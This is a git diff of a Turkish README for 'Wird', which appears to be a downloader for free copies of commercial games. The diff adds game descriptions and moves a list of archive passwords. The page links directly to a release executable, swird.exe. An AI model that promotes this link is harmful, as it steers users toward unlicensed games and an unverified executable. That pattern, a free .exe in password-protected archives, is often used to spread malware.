@@ -6,21 +6,15 @@
 
 ## ✨ **Özellikler**
 
-- **Geniş Oyun Yelpazesi**: Minecraft, FNAF serisi, Left 4 Dead 2 ve daha fazlası.
-- **Kullanıcı Dostu Arayüz**: Basit ve hızlı kullanım.
-- **Hızlı İndirme**: Oyunları hızlıca indirin.
+- **Çeşitli Oyunlar**: Minecraft, FNAF serisi, Left 4 Dead 2 ve daha fazlası.
+- **Kolay Kullanım**: Basit ve sezgisel arayüz ile hızlı erişim.
+- **Hızlı İndirme**: Oyunları kısa sürede indirme ve başlatma.
 
 ---
 
 ## ⬇️ **Wird İndir**
 
 ![Version](https://img.shields.io/badge/version-4.0.0-yellow)
-
-**⚠️ Şifreler:**
-
-- **12345**
-- **Oyunindir.club**
-- **Oyunindir.vip**
 
 [![Wird İndir](https://img.shields.io/badge/Wird-%C4%B0ndir-yellow?style=for-the-badge&logo=github)](https://github.com/sdwird/wird/releases/download/v4/swird.exe)
 
@@ -29,20 +23,61 @@
 ## 🎮 **Desteklenen Oyunlar**
 
 - **Minecraft**  
+  Popüler açık dünya hayatta kalma oyunu. Kendi dünyanızı inşa edin ve keşfedin.
+  
 - **Slope**  
-- **The Forest**  
-- **Dead Cells**  
-- **Baldi's Basics**  
-- **Stardew Valley**  
-- **Cluster Truck**  
-- **Rock of Ages 2**  
-- **Ultra Kill**  
-- **FNAF (1-5)**  
-- **HOI4**  
-- **Left 4 Dead 2**  
-- **ERSWS**  
-- **TABS**  
-- **Hotline Miami**  
-- **Papers, Please!**
+  Heyecan verici bir kayma oyununda engelleri aşarak en yüksek puanı hedefleyin.
 
+- **The Forest**  
+  Hayatta kalma ve korku unsurlarıyla dolu bir açık dünya oyunu. Ormanda hayatta kalmaya çalışın.
+
+- **Dead Cells**  
+  Rogue-like, aksiyon dolu metroidvania tarzı bir oyun. Sonsuz zindanlarda mücadele edin.
+
+- **Baldi's Basics**  
+  Korku ve eğlenceyi birleştiren bir okul temalı oyun. Baldi'den kaçmaya çalışın!
+
+- **Stardew Valley**  
+  Çiftlik hayatını keşfedin, bitkilerinizi yetiştirin ve kasabanızla etkileşimde bulunun.
+
+- **Cluster Truck**  
+  Aksiyon dolu parkurlarda kamyonlardan atlarken zorluklarla karşılaşın.
+
+- **Rock of Ages 2**  
+  Strateji ve aksiyonu birleştiren bir oyun. Rüzgarla taşları yuvarlayarak düşman kalelerini yok edin.
+
+- **Ultra Kill**  
+  Hızlı tempolu retro tarzı nişancı oyunu. Düşmanlarınızı öldürerek ilerleyin.
+
+- **FNAF (1-5)**  
+  Korku temalı hayatta kalma oyunları. Geceyi hayatta kalarak geçirin!
+
+- **HOI4 (Hearts of Iron 4)**  
+  Derin strateji oyunu. İkinci Dünya Savaşı'nı yeniden şekillendirin.
+
+- **Left 4 Dead 2**  
+  Kooperatif zombi öldürme oyunu. Arkadaşlarınızla birlikte hayatta kalmaya çalışın.
+
+- **ERSWS**  
+  Gerçekçi kuşatma savaşlarını simüle eden bir oyun. Stratejik düşünme becerilerinizi test edin.
+
+- **TABS (Totally Accurate Battle Simulator)**  
+  Komik ve eğlenceli bir savaş simülatörü. Eğlenceli savaşlarla vakit geçirin.
+
+- **Hotline Miami**  
+  Aksiyon dolu bir oyun. Yüksek tempolu dövüşlerle düşmanları alt edin.
+
+- **PPlayground (PEOPLE PLAYGROUND)**  
+  Fizik tabanlı şiddet ve simülasyon oyunu. Nesnelerle etkileşime girerek yaratıcı sahneler oluşturun.
+
+- **Papers, Please!**  
+  Göçmenlik kontrolü ve etik kararlar üzerine bir simülasyon. Her kararınız önemli!
+
+---
+
+## ⚠️ **Şifreler:**
+
+- **12345**
+- **Oyunindir.club**
+- **Oyunindir.vip**
 ---
